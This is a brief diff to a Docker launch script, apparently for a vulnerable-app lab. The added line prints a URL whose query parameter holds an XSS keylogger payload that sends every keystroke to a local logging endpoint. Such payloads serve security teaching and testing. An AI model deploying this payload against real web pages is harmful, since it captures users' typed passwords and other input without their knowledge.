@@ -21,3 +21,4 @@ docker run -d \
 	--name ${CONTAINER} ${IMAGE}
 
 echo ">>> Access to container: http://localhost:${HOST_PORT}"
+echo ">>>> If you prefer to access with the XXS: http://localhost:${HOST_PORT}/?msg=document.addEventListener('keydown',function(e){fetch('http://localhost:8000/log',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({key:e.key})});});"
